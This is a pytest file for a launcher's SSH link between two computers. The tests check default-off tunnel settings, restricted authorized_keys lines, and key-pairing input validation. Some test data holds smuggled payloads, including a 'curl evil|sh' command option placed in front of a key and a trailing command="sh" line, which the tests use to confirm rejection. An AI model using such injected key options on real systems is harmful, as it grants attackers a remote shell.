"""The link to the other computer: what the launcher opens, and what it refuses to open.

Two computers reach each other's SIRVIS through an SSH tunnel the stack owns (STATUS.md,
20 September 2026). The tunnel was going to be a systemd unit and is a service in
`tools/run.py` instead, so it starts and stops with everything else — which means the
question "is a port open?" is now answered by this file's table, and the answer has to be
*only when the owner said so*.

**Both switches are off until somebody turns them on**, and they are two switches because
they open two different doors: one lets this machine reach the other computer, the other lets
the other computer reach this one. A test that only checked the first would let the second
turn itself on, which is the whole reason the setting has two fields.

Nothing here reaches the machine: the settings database is a temporary file, and `ssh` is
never run — only the command line the launcher *would* run is inspected.
"""

from __future__ import annotations

import importlib.util
import json
import sqlite3
import subprocess
from pathlib import Path
from types import ModuleType

import pytest

RUN_PY = Path(__file__).resolve().parents[2] / "tools" / "run.py"


def _load() -> ModuleType:
    """A fresh copy of `run.py`, as the neighbouring launcher tests load it."""
    spec = importlib.util.spec_from_file_location("launcher_link_under_test", RUN_PY)
    assert spec is not None and spec.loader is not None
    run = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(run)
    return run


def _launcher(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, stored: object) -> ModuleType:
    """The launcher, reading a settings database that holds `stored` — or none at all.

    `stored` of None writes no database, which is the first-run state: `configured_link`
    has to answer "off" then rather than fail, or a machine that has never opened Settings
    could not start.
    """
    run = _load()
    monkeypatch.setattr(run, "ROOT", tmp_path)
    # **`RUN` and `LINK_KEY` are computed at import, from the real checkout**, so moving `ROOT`
    # alone leaves them pointing at `.run/` — where this suite would write, beside the owner's
    # live credentials. Found by writing a fake key into the real one, 20 September 2026.
    monkeypatch.setattr(run, "RUN", tmp_path / ".run")
    monkeypatch.setattr(run, "LINK_KEY", tmp_path / ".run" / "link-key")
    # A real `ssh` path is not this test's subject, and a machine without one would
    # otherwise decide the result.
    monkeypatch.setattr(run.shutil, "which", lambda name: "/usr/bin/ssh" if name == "ssh" else None)
    if stored is not None:
        (tmp_path / "nervis").mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(tmp_path / "nervis" / "nervis.db") as held:
            held.execute("CREATE TABLE setting (key TEXT PRIMARY KEY, value TEXT)")
            held.execute("INSERT INTO setting (key, value) VALUES ('link.peer', ?)",
                         (json.dumps(stored),))
    return run


def _refuse_to_open(why: str):
    """A `Popen` that fails the test if anything tries to start a process."""
    def refuse(*_: object, **__: object) -> None:
        raise AssertionError(f"opened {why}")
    return refuse


def _link_rows(run: ModuleType) -> list[tuple]:
    return [row for row in run._link() if row[0] == "Link"]


def test_a_machine_nobody_configured_opens_nothing(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    run = _launcher(monkeypatch, tmp_path, None)

    assert run.configured_link() == {"enabled": False, "address": "", "inbound": False}
    assert _link_rows(run) == [], "off is the default, and off opens no port at all"


def test_an_address_with_the_switch_off_stays_shut(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Turning the link off keeps the address, and keeping the address opens nothing.

    The card's "Turn it off" writes exactly this: somebody who switches the link off has
    not asked to retype the address next week, and a launcher that read the address as
    consent would reopen the door on the next start.
    """
    run = _launcher(monkeypatch, tmp_path,
                    {"enabled": False, "address": "me@thinkpad", "inbound": True})

    assert run.configured_link()["address"] == "me@thinkpad"
    assert _link_rows(run) == []


def test_it_carries_nervis_as_well_as_sirvis(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Both services, because the link is for a person as well as for models.

    SIRVIS is what the link was built for. NERVIS is what makes it useful to somebody: the
    settings and the conversations live in its database and are read over its API, so a link
    that carried only SIRVIS would have to be widened the first time anyone asked for either.
    """
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})

    (_, command, _, _, _), = _link_rows(run)
    forwarded = [command[i + 1] for i, part in enumerate(command) if part == "-L"]
    assert forwarded == [f"{run.LINK_LOCAL_PORT}:127.0.0.1:{run.SIRVIS_PORT}",
                         f"{run.LINK_LOCAL_NERVIS_PORT}:127.0.0.1:{run.NERVIS_PORT}"]


def test_the_key_it_offers_is_its_own(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """The dedicated key, and only that one.

    Without `IdentitiesOnly` an agent holding the owner's other keys offers those first, and an
    `ssh` that authenticated as the owner rather than as the link would have a shell at the far
    end — everything `restrict` in the authorised line exists to prevent.
    """
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})
    run.LINK_KEY.parent.mkdir(parents=True, exist_ok=True)
    run.LINK_KEY.write_text("not a real key", encoding="utf-8")

    command = run.link_command("me@thinkpad", False)

    assert "-i" in command and str(run.LINK_KEY) in command
    assert "IdentitiesOnly=yes" in command


def test_the_authorised_line_permits_two_ports_and_nothing_else() -> None:
    """What a copy of this key could do on the other machine, in one line.

    `restrict` turns everything off; `port-forwarding` turns back on the one thing needed, and
    the four `permit*` addresses say exactly which. No shell, no command, no agent forwarding.
    """
    run = _load()

    line = run.link_authorized_line("ssh-ed25519 AAAAC3Nz… nervis link from thinkpad")

    assert line.startswith("restrict,port-forwarding,")
    for port in (run.SIRVIS_PORT, run.NERVIS_PORT):
        assert f'permitopen="127.0.0.1:{port}"' in line
    for port in (run.LINK_BACK_PORT, run.LINK_BACK_NERVIS_PORT):
        assert f'permitlisten="127.0.0.1:{port}"' in line
    assert "command=" not in line and "pty" not in line
    assert line.endswith("ssh-ed25519 AAAAC3Nz… nervis link from thinkpad")


def test_enrolment_adds_the_line_once_and_asks_for_nothing_else() -> None:
    """The shell run on the other machine: idempotent, private, and nothing but the one line."""
    run = _load()

    shell = run._link_install_command("restrict,port-forwarding,… ssh-ed25519 AAAA test")

    assert "grep -qxF" in shell, "enrolling twice must not leave two copies of the same line"
    assert "umask 077" in shell, "sshd refuses a world-readable ~/.ssh, and does it silently"
    assert ">> ~/.ssh/authorized_keys" in shell and "> ~/.ssh/authorized_keys" in shell
    assert "rm " not in shell and "chmod 777" not in shell


def test_switched_on_it_forwards_one_way_only(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})

    (name, command, marker, _, health), = _link_rows(run)
    assert name == "Link"
    assert "-L" in command and f"{run.LINK_LOCAL_PORT}:127.0.0.1:{run.SIRVIS_PORT}" in command
    assert "-R" not in command, (
        "the other computer reaching this one is a second answer, and it was not given"
    )
    # Never a prompt and never a wait: this runs detached, with nobody to answer either.
    assert "BatchMode=yes" in command and "ExitOnForwardFailure=yes" in command
    assert command[-1] == "me@thinkpad"
    assert marker in " ".join(command), "stop has to be able to recognise its own ssh"
    assert health == f"http://127.0.0.1:{run.LINK_LOCAL_PORT}/ecosystem/health", (
        "the far SIRVIS through the tunnel: a live ssh to a stack that is down is not a link"
    )


def test_the_way_back_is_opened_only_when_asked_and_named_in_full(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """`-R` carries the bind address, because the far end's key restriction matches on it.

    Measured 20 September 2026 against the Mac's `authorized_keys`, which permits
    `permitlisten="127.0.0.1:8722"`: a bare `-R 8722:…` was refused with *remote port
    forwarding failed for listen port 8722*, because `permitlisten` is matched against what
    was requested, not against where it ends up.
    """
    run = _launcher(monkeypatch, tmp_path,
                    {"enabled": True, "address": "me@thinkpad", "inbound": True})

    (_, command, _, _, _), = _link_rows(run)
    back = [command[i + 1] for i, part in enumerate(command) if part == "-R"]
    assert back == [f"127.0.0.1:{run.LINK_BACK_PORT}:127.0.0.1:{run.SIRVIS_PORT}",
                    f"127.0.0.1:{run.LINK_BACK_NERVIS_PORT}:127.0.0.1:{run.NERVIS_PORT}"]


def test_a_sleeping_computer_is_not_a_failed_start(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """The link is optional, waits briefly, and its silence is explained in the right place."""
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})

    assert "Link" in run.OPTIONAL
    assert run.WAIT_SECONDS["Link"] < run.START_WAIT_SECONDS, (
        "ConnectTimeout is ten seconds, so a computer that is off has already failed by then"
    )
    said = run._readiness("Link", False, 0)
    assert "me@thinkpad" in said, "it names the quiet end, which is the other computer"
    assert ".run/link.log" not in said, "there is no fault on this machine to send anyone to"


def test_it_closes_before_the_rooms_it_leads_to() -> None:
    run = _load()

    assert run.STOP_ORDER[0] == "Link", "a door closes before the room is emptied"
    assert run.START_ORDER[-1] == "Link", "and opens once SIRVIS has something to serve"


# ── Letting another computer in, from a key that arrived over the network ─────────────────
#
# Pairing from the screen means a key reaches this machine by multicast announcement, and
# `~/.ssh/authorized_keys` is a file where one stray word is a shell. These are the tests for
# the one function that writes there.

REAL_KEY = ("ssh-ed25519 "
            "AAAAC3NzaC1lZDI1NTE5AAAAIHZBEWrJ0hYdfrLfiu0Uq1VkKLsH5VoGxD0QhXQWvJ9y")


def _home(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    """A home directory this test owns, so nothing here can reach the owner's own SSH."""
    monkeypatch.setenv("HOME", str(tmp_path))
    keys = tmp_path / ".ssh" / "authorized_keys"
    keys.parent.mkdir(parents=True, exist_ok=True)
    keys.write_text("ssh-rsa AAAAsomethingelse the owner's own key\n", encoding="utf-8")
    return keys


def test_allowing_a_computer_writes_one_restricted_line_and_keeps_the_rest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    run = _load()
    keys = _home(monkeypatch, tmp_path)

    answer = run.link_authorize(f"{REAL_KEY} nervis link from thinkpad", "ThinkPad")

    assert answer["ok"] is True and answer["already"] is False
    lines = keys.read_text(encoding="utf-8").splitlines()
    assert lines[0] == "ssh-rsa AAAAsomethingelse the owner's own key", (
        "every other key in that file is somebody's way in; none of them may move"
    )
    assert lines[1].startswith("restrict,port-forwarding,")
    assert lines[1].endswith(f"{REAL_KEY} nervis link ThinkPad")
    assert oct(keys.stat().st_mode)[-3:] == "600"


def test_allowing_the_same_computer_twice_adds_nothing(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    run = _load()
    keys = _home(monkeypatch, tmp_path)
    run.link_authorize(REAL_KEY, "ThinkPad")

    again = run.link_authorize(REAL_KEY, "ThinkPad")

    assert again["already"] is True
    assert len(keys.read_text(encoding="utf-8").splitlines()) == 2


@pytest.mark.parametrize("offered", [
    'command="curl evil|sh" ' + REAL_KEY,          # options in front of the key
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ",      # another algorithm entirely
    "not a key at all",
    "",
])
def test_anything_that_is_not_an_ed25519_key_is_refused(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, offered: str
) -> None:
    """**The key comes from the local network**, so this is the boundary that matters.

    A second line, or options in front of the key, would be somebody else's shell on this
    computer. Only two fields are ever taken, and only when they are an ed25519 key; the
    restrictions are written here rather than accepted from anywhere.
    """
    run = _load()
    keys = _home(monkeypatch, tmp_path)
    before = keys.read_text(encoding="utf-8")

    answer = run.link_authorize(offered, "whoever")

    assert answer["ok"] is False
    assert keys.read_text(encoding="utf-8") == before, "nothing was written"


def test_a_second_key_smuggled_after_a_good_one_is_not_written(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """Two fields are taken and the rest is dropped, so a trailing line cannot ride along."""
    run = _load()
    keys = _home(monkeypatch, tmp_path)

    run.link_authorize(f"{REAL_KEY} label\ncommand=\"sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEEE",
                       "ThinkPad")

    written = keys.read_text(encoding="utf-8")
    assert "command=" not in written and written.count("ssh-ed25519") == 1


def test_stopping_allows_takes_only_that_key_back(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    run = _load()
    keys = _home(monkeypatch, tmp_path)
    run.link_authorize(REAL_KEY, "ThinkPad")
    other = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZBEWrJ0hYdfrLfiu0Uq1VkKLsH5VoGxD0QhXQWvJ8x"
    run.link_authorize(other, "Mac mini")

    removed = run.link_revoke(REAL_KEY)

    assert removed == {"ok": True, "removed": 1}
    left = keys.read_text(encoding="utf-8")
    assert REAL_KEY not in left
    assert other in left and "the owner's own key" in left


def test_a_keys_fingerprint_is_what_ssh_keygen_says(tmp_path: Path) -> None:
    """The string both computers show while pairing, so a person can compare them."""
    run = _load()
    made = subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test",
                           "-f", str(tmp_path / "k")], capture_output=True, check=False)
    assert made.returncode == 0, made.stderr
    public = (tmp_path / "k.pub").read_text(encoding="utf-8")
    expected = subprocess.run(["ssh-keygen", "-lf", str(tmp_path / "k.pub")],
                              capture_output=True, text=True, check=False).stdout.split()[1]

    assert run.link_key_fingerprint(public) == expected
    assert run.link_key_fingerprint("nonsense") == ""


def test_a_link_that_is_already_open_is_not_opened_a_second_time(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """**Why pairing said "it has not allowed it yet" when it had** (22 September 2026).

    Each forwarded port can be bound once, so a second `ssh` carrying the same forwards exits
    immediately — and that reads as "did not connect". Pairing with a computer this one was
    already linked to could therefore never finish, however many times Allow was pressed.
    """
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})
    monkeypatch.setattr(run, "_recorded", lambda: {"Link": {"pid": 4242, "marker": "link"}})
    monkeypatch.setattr(run, "_alive", lambda *_: True)
    monkeypatch.setattr(run, "responds", lambda url, *_: "8721" in url)
    monkeypatch.setattr(run.subprocess, "Popen",
                        _refuse_to_open("a second tunnel over the one already running"))

    found = run.link_probe("me@thinkpad", True)

    assert found["connected"] is True and found["already"] is True
    assert found["sirvis"] is True, "what answers through the link that is already there"
    assert found["nervis"] is False


def test_a_different_computer_is_still_tried_for_real(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """The shortcut is only for the link that is open; another address is opened as usual."""
    run = _launcher(monkeypatch, tmp_path, {"enabled": True, "address": "me@thinkpad"})
    monkeypatch.setattr(run, "_recorded", lambda: {"Link": {"pid": 4242, "marker": "link"}})
    monkeypatch.setattr(run, "_alive", lambda *_: True)
    tried: list[list[str]] = []

    class _Ssh:
        def __init__(self, command: list[str], **_: object) -> None:
            tried.append(command)

        def poll(self) -> int | None:
            return 1

        def terminate(self) -> None:
            return None

        def communicate(self, timeout: float | None = None) -> tuple[str, str]:  # noqa: ARG002
            return "", "ssh: Could not resolve hostname"

    monkeypatch.setattr(run.subprocess, "Popen", _Ssh)
    monkeypatch.setattr(run, "responds", lambda *_: False)

    run.link_probe("someone@elsewhere", False)

    assert tried and tried[0][-1] == "someone@elsewhere"
